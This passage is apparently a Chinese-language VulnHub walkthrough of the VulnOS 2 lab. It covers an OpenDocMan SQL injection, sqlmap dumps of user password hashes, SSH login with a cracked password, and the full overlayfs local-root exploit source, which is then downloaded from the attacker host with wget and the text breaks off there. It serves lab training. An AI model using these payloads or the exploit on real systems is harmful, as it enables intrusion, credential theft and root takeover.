<p>从其结果中，发现了利用32075.txt的漏洞，该漏洞显示“由于对“/ajax_udf.php”脚本中的“add_value” HTTP GET参数的验证不足而存在该漏洞。远程未经身份验证的攻击者可以在应用程序的数据库中执行任意SQL命令。”</p>
<p>现在查看一下exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/32075.txt</span></span><br><span class="line">Advisory ID: HTB23202</span><br><span class="line">Product: OpenDocMan</span><br><span class="line">Vendor: Free Document Management Software</span><br><span class="line">Vulnerable Version(s): 1.2.7 and probably prior</span><br><span class="line">Tested Version: 1.2.7</span><br><span class="line">Advisory Publication: February 12, 2014 [without technical details]</span><br><span class="line">Vendor Notification: February 12, 2014</span><br><span class="line">Vendor Patch: February 24, 2014</span><br><span class="line">Public Disclosure: March 5, 2014</span><br><span class="line">Vulnerability Type: SQL Injection [CWE-89], Improper Access Control [CWE-284]</span><br><span class="line">CVE References: CVE-2014-1945, CVE-2014-1946</span><br><span class="line">Risk Level: High</span><br><span class="line">CVSSv2 Base Scores: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P), 6.5 (AV:N/AC:L/Au:S/C:P/I:P/A:P)</span><br><span class="line">Solution Status: Fixed by Vendor</span><br><span class="line">Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">Advisory Details:</span><br><span class="line">                                                                                                                             </span><br><span class="line">High-Tech Bridge Security Research Lab discovered multiple vulnerabilities <span class="keyword">in</span> OpenDocMan, <span class="built_in">which</span> can be exploited to perform SQL Injection and gain administrative access to the application.                                                              </span><br><span class="line"></span><br><span class="line">1) SQL Injection <span class="keyword">in</span> OpenDocMan: CVE-2014-1945</span><br><span class="line"></span><br><span class="line">The vulnerability exists due to insufficient validation of <span class="string">&quot;add_value&quot;</span> HTTP GET parameter <span class="keyword">in</span> <span class="string">&quot;/ajax_udf.php&quot;</span> script. A remote unauthenticated attacker can execute arbitrary SQL commands <span class="keyword">in</span> application<span class="string">&#x27;s database.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The exploitation example below displays version of the MySQL server:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://[host]/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,v</span></span><br><span class="line"><span class="string">ersion%28%29,3,4,5,6,7,8,9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2) Improper Access Control in OpenDocMan: CVE-2014-1946</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The vulnerability exists due to insufficient validation of allowed action in &quot;/signup.php&quot; script when updating userâ??s profile. A remote authenticated attacker can assign administrative privileges to the current account and gain complete control over the application.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The exploitation example below assigns administrative privileges for the current account:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;form action=&quot;http://[host]/signup.php&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;hidden&quot; name=&quot;updateuser&quot; value=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;hidden&quot; name=&quot;admin&quot; value=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;[USER_ID]&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;Run&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">-----------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Solution:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Update to OpenDocMan v1.2.7.2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">More Information:</span></span><br><span class="line"><span class="string">http://www.opendocman.com/opendocman-v1-2-7-1-release/</span></span><br><span class="line"><span class="string">http://www.opendocman.com/opendocman-v1-2-7-2-released/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">-----------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">References:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[1] High-Tech Bridge Advisory HTB23202 - https://www.htbridge.com/advisory/HTB23202 - Multiple vulnerabilities in OpenDocMan.</span></span><br><span class="line"><span class="string">[2] OpenDocMan - http://www.opendocman.com/ - Open Source Document Management System written in PHP.</span></span><br><span class="line"><span class="string">[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVEÂ® is a dictionary of publicly known information security vulnerabilities and exposures.</span></span><br><span class="line"><span class="string">[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.</span></span><br><span class="line"><span class="string">[5] ImmuniWebÂ® - http://www.htbridge.com/immuniweb/ - is High-Tech Bridge&#x27;</span>s proprietary web application security assessment solution with SaaS delivery model that combines manual and automated vulnerability testing.</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">Disclaimer: The information provided <span class="keyword">in</span> this Advisory is provided <span class="string">&quot;as is&quot;</span> and without any warranty of any kind. Details of this Advisory may be updated <span class="keyword">in</span> order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] <span class="keyword">in</span> the References.</span><br></pre></td></tr></table></figure>

<p>现在，使用sqlmap来查找用户名和密码的数据库，像下面这样：</p>
<p>该操作使用了burp中与sqlmap联动的插件，右键可以直接注入</p>
<ul>
<li>跑库</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1&gt;sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1587350985142.req --level 5 --risk 3 --dbs</span><br><span class="line">available databases [6]:</span><br><span class="line">[*] drupal7</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] jabcd0cs</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br></pre></td></tr></table></figure>

<ul>
<li>跑表</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1&gt;sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1587350985142.req --level 5 --risk 3 -D jabcd0cs --tables</span><br><span class="line">Database: jabcd0cs</span><br><span class="line">[15 tables]</span><br><span class="line">+-------------------+</span><br><span class="line">| odm_access_log    |</span><br><span class="line">| odm_admin         |</span><br><span class="line">| odm_category      |</span><br><span class="line">| odm_data          |</span><br><span class="line">| odm_department    |</span><br><span class="line">| odm_dept_perms    |</span><br><span class="line">| odm_dept_reviewer |</span><br><span class="line">| odm_filetypes     |</span><br><span class="line">| odm_log           |</span><br><span class="line">| odm_odmsys        |</span><br><span class="line">| odm_rights        |</span><br><span class="line">| odm_settings      |</span><br><span class="line">| odm_udf           |</span><br><span class="line">| odm_user          |</span><br><span class="line">| odm_user_perms    |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>

<ul>
<li>跑用户名和密码的hash值</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1&gt;sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1587350985142.req --level 5 --risk 3 -D jabcd0cs -T odm_user --dump</span><br><span class="line">Database: jabcd0cs</span><br><span class="line">Table: odm_user</span><br><span class="line">[2 entries]</span><br><span class="line">+------+-------------+--------------------+----------+-----------+------------+------------------------------------------+------------+---------------+</span><br><span class="line">| id   | phone       | Email              | username | last_name | first_name | password                                 | department | pw_reset_code |</span><br><span class="line">+------+-------------+--------------------+----------+-----------+------------+------------------------------------------+------------+---------------+</span><br><span class="line">| 1    | 5555551212  | webmin@example.com | webmin   | min       | web        | b78aae356709f8c31118ea613980954b         | 2          | &lt;blank&gt;       |</span><br><span class="line">| 2    | 555 5555555 | guest@example.com  | guest    | guest     | guest      | 084e0343a0486ff05530df6c705c8bb4 (guest) | 2          | NULL          |</span><br><span class="line">+------+-------------+--------------------+----------+-----------+------------+------------------------------------------+------------+---------------+</span><br></pre></td></tr></table></figure>

<p>使用在线解密工具破解一下webmin的hash值</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub268.jpg"></li>
</ul>
<p>webmin/webmin1980</p>
<p>密码为webmin1980，用户名为webmin。通过SSH端口登录。在kali中打开一个新终端，然后键入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh webmin@192.168.56.104</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.104 (192.168.56.104)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:nIyyJRPJMy1g6F5m8AIT7W//x6lj3ZqhUbYuvSafKeI.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.104<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">webmin@192.168.56.104&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Mon Apr 20 04:13:19 CEST 2020</span><br><span class="line"></span><br><span class="line">  System load: 0.15              Memory usage: 2%   Processes:       57</span><br><span class="line">  Usage of /:  5.7% of 29.91GB   Swap usage:   0%   Users logged <span class="keyword">in</span>: 0</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at:</span><br><span class="line">    https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">Last login: Wed May  4 10:41:07 2016</span><br><span class="line">$ id</span><br><span class="line">uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)</span><br><span class="line">$ whoami</span><br><span class="line">webmin</span><br><span class="line">$ uname -a</span><br><span class="line">Linux VulnOSv2 3.13.0-24-generic <span class="comment">#47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>检查内核的版本，看看它是否容易受到攻击。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 14.04.4 LTS</span><br><span class="line">Release:        14.04</span><br><span class="line">Codename:       trusty</span><br></pre></td></tr></table></figure>

<p>版本是14.04，表示可以被利用，并且适用于该类型：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 14.04</span></span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                                      |  Path</span><br><span class="line">                                                                                    | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation             | exploits/linux/<span class="built_in">local</span>/37088.c</span><br><span class="line">Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege Escalation                         | exploits/linux/<span class="built_in">local</span>/36782.sh</span><br><span class="line">Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / Ce | exploits/linux_x86-64/<span class="built_in">local</span>/42275.c</span><br><span class="line">Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - <span class="string">&#x27;ldso | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 14.04.3) - &#x27;</span>perf_event_open()<span class="string">&#x27; Can Race with execve() (Access  | exploits/linux/local/39771.txt</span></span><br><span class="line"><span class="string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="string">&#x27; Local Pri | exploits/linux/local/37292.c</span></span><br><span class="line"><span class="string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="string">&#x27; Local Pri | exploits/linux/local/37293.txt</span></span><br><span class="line"><span class="string">Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free usb-midi SMEP | exploits/linux/local/41999.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &#x27;</span>overlayfs<span class="string">&#x27; Local Privilege Escalation (1 | exploits/linux/local/39166.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#x27;</span>AF_PACKET<span class="string">&#x27; Race Condition Privile | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - &#x27;</span>AF_PACKET<span class="string">&#x27; Race Con | exploits/linux/local/47170.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalat | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Loc | exploits/linux/local/47169.c</span></span><br><span class="line"><span class="string">NetKit FTP Client (Ubuntu 14.04) - Crash/Denial of Service (PoC)                    | exploits/linux/dos/37777.txt</span></span><br><span class="line"><span class="string">Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation     | exploits/linux/local/41762.txt</span></span><br><span class="line"><span class="string">WebKitGTK 2.1.2 (Ubuntu 14.04) - Heap based Buffer Overflow                         | exploits/linux/local/44204.md</span></span><br><span class="line"><span class="string">usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation           | exploits/linux/local/36820.txt</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------------ ----------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>列出了许多可以利用的漏洞，从其中选择37292.c作为overlayfs的“本地提权”。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - <span class="string">&#x27;overlayfs&#x27;</span> Local Pri | exploits/linux/<span class="built_in">local</span>/37292.c</span><br></pre></td></tr></table></figure>

<p>查看exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat /usr/share/exploitdb/exploits/linux/local/37292.c</span></span><br><span class="line">/*</span><br><span class="line"><span class="comment"># Exploit Title: ofs.c - overlayfs local root in ubuntu</span></span><br><span class="line"><span class="comment"># Date: 2015-06-15</span></span><br><span class="line"><span class="comment"># Exploit Author: rebel</span></span><br><span class="line"><span class="comment"># Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04</span></span><br><span class="line"><span class="comment"># CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)</span></span><br><span class="line"></span><br><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">CVE-2015-1328 / ofs.c</span><br><span class="line">overlayfs incorrect permission handling + FS_USERNS_MOUNT</span><br><span class="line"></span><br><span class="line">user@ubuntu-server-1504:~$ uname -a</span><br><span class="line">Linux ubuntu-server-1504 3.19.0-18-generic <span class="comment">#18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">user@ubuntu-server-1504:~$ gcc ofs.c -o ofs</span><br><span class="line">user@ubuntu-server-1504:~$ id</span><br><span class="line">uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)</span><br><span class="line">user@ubuntu-server-1504:~$ ./ofs</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)</span><br><span class="line"></span><br><span class="line">greets to beist &amp; kaliman</span><br><span class="line">2015-05-24</span><br><span class="line">%rebel%</span><br><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mount.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mount.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;signal.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define LIB &quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><span class="line"></span><br><span class="line">static char child_stack[1024*1024];</span><br><span class="line"></span><br><span class="line">static int</span><br><span class="line">child_exec(void *stuff)</span><br><span class="line">&#123;</span><br><span class="line">    char *file;</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/ns_sploit&quot;</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit&quot;</span>, 0777);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/work&quot;</span>, 0777);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/upper&quot;</span>,0777);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>,0777);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr,<span class="string">&quot;mount #1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlayfs&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;</span>) != 0) &#123;</span><br><span class="line">// workdir= and <span class="string">&quot;overlay&quot;</span> is needed on newer kernels, also can<span class="string">&#x27;t use /proc as lower</span></span><br><span class="line"><span class="string">        if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">            fprintf(stderr, &quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;);</span></span><br><span class="line"><span class="string">            exit(-1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        file = &quot;.access&quot;;</span></span><br><span class="line"><span class="string">        chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777);</span></span><br><span class="line"><span class="string">    &#125; else file = &quot;ns_last_pid&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chdir(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">    rename(file,&quot;ld.so.preload&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chdir(&quot;/&quot;);</span></span><br><span class="line"><span class="string">    umount(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;mount #2\n&quot;);</span></span><br><span class="line"><span class="string">    if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">        if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">            exit(-1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/ns_sploit/o/ld.so.preload&quot;,0777);</span></span><br><span class="line"><span class="string">    umount(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int</span></span><br><span class="line"><span class="string">main(int argc, char **argv)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int status, fd, lib;</span></span><br><span class="line"><span class="string">    pid_t wrapper, init;</span></span><br><span class="line"><span class="string">    int clone_flags = CLONE_NEWNS | SIGCHLD;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;spawning threads\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if((wrapper = fork()) == 0) &#123;</span></span><br><span class="line"><span class="string">        if(unshare(CLONE_NEWUSER) != 0)</span></span><br><span class="line"><span class="string">            fprintf(stderr, &quot;failed to create new user namespace\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if((init = fork()) == 0) &#123;</span></span><br><span class="line"><span class="string">            pid_t pid =</span></span><br><span class="line"><span class="string">                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span></span><br><span class="line"><span class="string">            if(pid &lt; 0) &#123;</span></span><br><span class="line"><span class="string">                fprintf(stderr, &quot;failed to create new mount namespace\n&quot;);</span></span><br><span class="line"><span class="string">                exit(-1);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            waitpid(pid, &amp;status, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        waitpid(init, &amp;status, 0);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    usleep(300000);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    wait(NULL);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;child threads done\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fd = open(&quot;/etc/ld.so.preload&quot;,O_WRONLY);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(fd == -1) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr,&quot;exploit failed\n&quot;);</span></span><br><span class="line"><span class="string">        exit(-1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;/etc/ld.so.preload created\n&quot;);</span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;creating shared library\n&quot;);</span></span><br><span class="line"><span class="string">    lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777);</span></span><br><span class="line"><span class="string">    write(lib,LIB,strlen(LIB));</span></span><br><span class="line"><span class="string">    close(lib);</span></span><br><span class="line"><span class="string">    lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);</span></span><br><span class="line"><span class="string">    if(lib != 0) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr,&quot;couldn&#x27;</span>t create dynamic library\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        exit(-1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    write(fd,&quot;</span>/tmp/ofs-lib.so\n<span class="string">&quot;,16);</span></span><br><span class="line"><span class="string">    close(fd);</span></span><br><span class="line"><span class="string">    system(&quot;</span>rm -rf /tmp/ns_sploit /tmp/ofs-lib.c<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    execl(&quot;</span>/bin/su<span class="string">&quot;,&quot;</span>su<span class="string">&quot;,NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>将exploit拷贝一份过来然后传输到目标机器上编译并运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnos-2<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/37292.c .</span></span><br><span class="line">root@kali:~/vulnhub/vulnos-2<span class="comment"># ls</span></span><br><span class="line">37292.c</span><br><span class="line">root@kali:~/vulnhub/vulnos-2<span class="comment"># python -m SimpleHTTPServer </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...                                                                                      </span><br><span class="line">192.168.56.1 - - [19/Apr/2020 23:29:04] code 404, message File not found                                                   </span><br><span class="line">192.168.56.1 - - [19/Apr/2020 23:29:04] <span class="string">&quot;GET /robots.txt HTTP/1.1&quot;</span> 404 -                                                     </span><br><span class="line">192.168.56.1 - - [19/Apr/2020 23:29:04] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [19/Apr/2020 23:29:04] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [19/Apr/2020 23:29:04] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.104 - - [19/Apr/2020 23:29:54] <span class="string">&quot;GET /37292.c HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>受害机器运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://192.168.56.102:8000/37292.c</span><br><span class="line">--2020-04-20 05:29:53--  http://192.168.56.102:8000/37292.c</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 5119 (5.0K) [text/plain]</span><br><span class="line">Saving to: ‘37292.c’</span><br><span class="line"></span><br><span class="line">100%[===================================================================================&gt;] 5,119       --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-04-20 05:29:53 (895 MB/s) - ‘37292.c’ saved [5119/5119]</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">37292.c</span><br><span class="line">$ chmod 777 *</span><br><span class="line">$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwxrwxrwx  2 root   root   4096 Apr 20 05:29 .</span><br><span class="line">drwxr-xr-x 21 root   root   4096 Apr  3  2016 ..</span><br><span class="line">-rwxrwxrwx  1 webmin webmin 5119 Apr 20 05:28 